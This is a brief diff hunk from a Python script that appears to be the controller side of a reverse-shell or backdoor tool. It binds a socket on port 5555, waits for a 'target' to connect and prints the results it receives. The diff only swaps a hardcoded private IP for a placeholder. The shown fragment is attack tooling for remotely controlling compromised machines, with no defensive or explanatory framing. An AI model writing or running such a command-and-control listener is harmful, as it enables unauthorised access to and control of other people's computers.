@@ -69,7 +69,7 @@ def target_communication():
             print(result)
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('192.168.1.219', 5555))  # Replace with your server IP
+sock.bind(('<YOUR_SERVER_IP>', 5555))  # Replace with your server IP
 print('[+] Listening for incoming connections...')
 sock.listen(5)
 target, ip = sock.accept()
